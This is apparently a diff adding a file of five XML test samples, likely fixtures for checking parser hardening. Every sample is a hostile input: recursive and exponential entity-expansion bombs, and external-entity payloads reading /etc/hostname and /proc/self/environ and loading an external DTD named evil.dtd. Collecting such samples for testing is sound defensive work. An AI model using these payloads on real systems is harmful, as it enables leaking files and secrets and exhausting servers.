@@ -1,0 +1,60 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root id ID #REQUIRED>
+  <!ENTITY % param "&#x25;param;">
+  <!ENTITY nested "%param;%param;%param;">
+]>
+<root id="test1">&nested;</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE config [
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % dtd SYSTEM "http://localhost/evil.dtd">
+  %dtd;
+]>
+<config>
+  <setting name="value">&file;</setting>
+</config>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY ent1 "A">
+  <!ENTITY ent2 "&#38;ent1;&#38;ent1;">
+  <!ENTITY ent3 "&#38;ent2;&#38;ent2;&#38;ent2;&#38;ent2;">
+  <!ENTITY ent4 "&#38;ent3;&#38;ent3;&#38;ent3;">
+]>
+<data>
+  <item>&ent4;&ent4;&ent4;</item>
+</data>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % internal "<!ENTITY &#x25; external SYSTEM 'file:///proc/self/environ'>">
+  %internal;
+  %external;
+]>
+<root>
+  <payload/>
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE mixed [
+  <!ELEMENT mixed (child*)>
+  <!ELEMENT child (#PCDATA | child)*>
+  <!ENTITY % recursive "&#60;child&#62;&#38;#x25;recursive;&#60;/child&#62;">
+  <!ENTITY expand "%recursive;%recursive;%recursive;%recursive;%recursive;">
+]>
+<mixed>
+  &expand;
+</mixed>
+```
